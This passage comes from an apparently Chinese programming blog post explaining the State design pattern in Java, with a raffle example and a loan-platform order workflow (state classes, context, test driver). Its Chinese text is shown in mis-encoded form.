<span class="hljs-built_in">this</span>.canRaffleState = canRaffleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getDispenseState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dispenseState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDispenseState</span><span class="hljs-params">(State dispenseState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dispenseState = dispenseState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getDispensOutState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dispensOutState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDispensOutState</span><span class="hljs-params">(State dispensOutState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dispensOutState = dispensOutState;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>State.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * çŠ¶æ€æŠ½è±¡ç±»</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <br>   <span class="hljs-comment">// æ‰£é™¤ç§¯åˆ† - 50</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-comment">// æ˜¯å¦æŠ½ä¸­å¥–å“</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-comment">// å‘æ”¾å¥–å“</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--------</span><span class="hljs-comment">ç¬¬1æ¬¡æŠ½å¥–</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">æ‰£é™¤50ç§¯åˆ†æˆåŠŸï¼Œæ‚¨å¯ä»¥æŠ½å¥–äº†</span><br><span class="hljs-comment">æ­£åœ¨æŠ½å¥–ï¼Œè¯·ç¨ç­‰ï¼</span><br><span class="hljs-comment">æ­å–œä¸­å¥–äº†</span><br><span class="hljs-literal">--------</span><span class="hljs-comment">ç¬¬2æ¬¡æŠ½å¥–</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">æ‰£é™¤50ç§¯åˆ†æˆåŠŸï¼Œæ‚¨å¯ä»¥æŠ½å¥–äº†</span><br><span class="hljs-comment">æ­£åœ¨æŠ½å¥–ï¼Œè¯·ç¨ç­‰ï¼</span><br><span class="hljs-comment">å¾ˆé—æ†¾ï¼Œå¥–å“å‘é€å®Œäº†</span><br><span class="hljs-literal">--------</span><span class="hljs-comment">ç¬¬3æ¬¡æŠ½å¥–</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ </span><br><span class="hljs-comment">å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ </span><br><span class="hljs-literal">--------</span><span class="hljs-comment">ç¬¬4æ¬¡æŠ½å¥–</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ </span><br><span class="hljs-comment">å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ </span><br><span class="hljs-literal">--------</span><span class="hljs-comment">ç¬¬5æ¬¡æŠ½å¥–</span><span class="hljs-literal">----------</span><br><span class="hljs-comment">å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ </span><br><span class="hljs-comment">å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ </span><br></code></pre></td></tr></table></figure><h3 id="çŠ¶æ€æ¨¡å¼åœ¨å®é™…é¡¹ç›®-å€Ÿè´·å¹³å°-æºç å‰–æ"><a class="markdownIt-Anchor" href="#çŠ¶æ€æ¨¡å¼åœ¨å®é™…é¡¹ç›®-å€Ÿè´·å¹³å°-æºç å‰–æ"></a> çŠ¶æ€æ¨¡å¼åœ¨å®é™…é¡¹ç›®-å€Ÿè´·å¹³å° æºç å‰–æ</h3><ol><li>å€Ÿè´·å¹³å°çš„è®¢å•ï¼Œæœ‰å®¡æ ¸-å‘å¸ƒ-æŠ¢å• ç­‰ç­‰ æ­¥éª¤ï¼Œéšç€æ“ä½œçš„ä¸åŒï¼Œä¼šæ”¹å˜è®¢å•çš„çŠ¶æ€, é¡¹ç›®ä¸­çš„è¿™ä¸ªæ¨¡å—å®ç°å°±ä¼šä½¿ç”¨åˆ°çŠ¶æ€æ¨¡å¼</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105154135954.png" alt="image-20230105154135954" /></p><p><code>AbstractState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractState</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RuntimeException</span> <span class="hljs-variable">EXCEPTION</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;æ“ä½œæµç¨‹ä¸å…è®¸&quot;</span>);<br><br>   <span class="hljs-comment">//æŠ½è±¡ç±»ï¼Œé»˜è®¤å®ç°äº† State æ¥å£çš„æ‰€æœ‰æ–¹æ³•</span><br>   <span class="hljs-comment">//è¯¥ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œå…¶å­ç±»(å…·ä½“çš„çŠ¶æ€ç±»)ï¼Œå¯ä»¥æœ‰é€‰æ‹©çš„è¿›è¡Œé‡å†™</span><br>   <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderFailureEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">throw</span> EXCEPTION;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>AllState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">//å„ç§å…·ä½“çŠ¶æ€ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FeedBackState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.FEED_BACKED.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenerateState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReviewState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.GENERATE.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NotPayState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaidState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.NOT_PAY.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PaidState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.PAID.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PublishState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      <span class="hljs-comment">//æŠŠå½“å‰çŠ¶æ€è®¾ç½®ä¸º  NotPayStateã€‚ã€‚ã€‚</span><br>      <span class="hljs-comment">//è‡³äºåº”è¯¥å˜æˆå“ªä¸ªçŠ¶æ€ï¼Œæœ‰æµç¨‹å›¾æ¥å†³å®š</span><br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NotPayState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FeedBackState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.PUBLISHED.getValue();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReviewState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PublishState</span>());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> StateEnum.REVIEWED.getValue();<br>   &#125;<br><br>&#125;```<br>`ClientTest.java`<br>â€‹```java<br><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">/**æµ‹è¯•ç±»*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientTest</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºcontext å¯¹è±¡</span><br>      <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Context</span>();<br>        <span class="hljs-comment">//å°†å½“å‰çŠ¶æ€è®¾ç½®ä¸º PublishState</span><br>      context.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PublishState</span>());<br>        System.out.println(context.getCurrentState());<br>        <br><span class="hljs-comment">//        //publish --&gt; not pay</span><br>        context.acceptOrderEvent(context);<br><span class="hljs-comment">//        //not pay --&gt; paid</span><br>        context.payOrderEvent(context);<br><span class="hljs-comment">//        // å¤±è´¥, æ£€æµ‹å¤±è´¥æ—¶ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-comment">//        try &#123;</span><br><span class="hljs-comment">//         context.checkFailEvent(context);</span><br><span class="hljs-comment">//         System.out.println(&quot;æµç¨‹æ­£å¸¸..&quot;);</span><br><span class="hljs-comment">//    &#125; catch (Exception e) &#123;</span><br><span class="hljs-comment">//       // <span class="hljs-doctag">TODO:</span> handle exception</span><br><span class="hljs-comment">//       System.out.println(e.getMessage());</span><br><span class="hljs-comment">//    &#125;</span><br>        <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Context.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">//ç¯å¢ƒä¸Šä¸‹æ–‡</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Context</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractState</span>&#123;<br>   <span class="hljs-comment">//å½“å‰çš„çŠ¶æ€ state, æ ¹æ®æˆ‘ä»¬çš„ä¸šåŠ¡æµç¨‹å¤„ç†ï¼Œä¸åœçš„å˜åŒ–</span><br>   <span class="hljs-keyword">private</span> State state;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.checkEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.checkFailEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.makePriceEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.acceptOrderEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.notPeopleAcceptEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.payOrderEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderFailureEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.orderFailureEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span> &#123;<br>        state.feedBackEvent(<span class="hljs-built_in">this</span>);<br>        getCurrentState();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> state;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(State state)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = state;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å½“å‰çŠ¶æ€ : &quot;</span> + state.getCurrentState());<br>        <span class="hljs-keyword">return</span> state.getCurrentState();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>State.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * çŠ¶æ€æ¥å£</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç”µå®¡</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç”µå®¡å¤±è´¥</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkFailEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å®šä»·å‘å¸ƒ</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">makePriceEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ¥å•</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">acceptOrderEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ— äººæ¥å•å¤±æ•ˆ</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">notPeopleAcceptEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span 